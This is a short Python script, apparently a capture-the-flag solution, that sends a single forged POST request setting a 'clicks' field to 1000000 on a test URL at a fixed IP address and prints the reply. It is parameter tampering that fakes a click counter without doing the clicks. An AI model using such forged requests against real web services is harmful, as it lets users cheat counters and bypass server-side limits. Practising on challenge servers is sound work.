import requests

url='http://123.206.87.240:9001/test/'
ss = requests.session()

payload={'clicks':1000000}
post = ss.post(url,payload)
content = post.content.decode('utf-8')
print(content)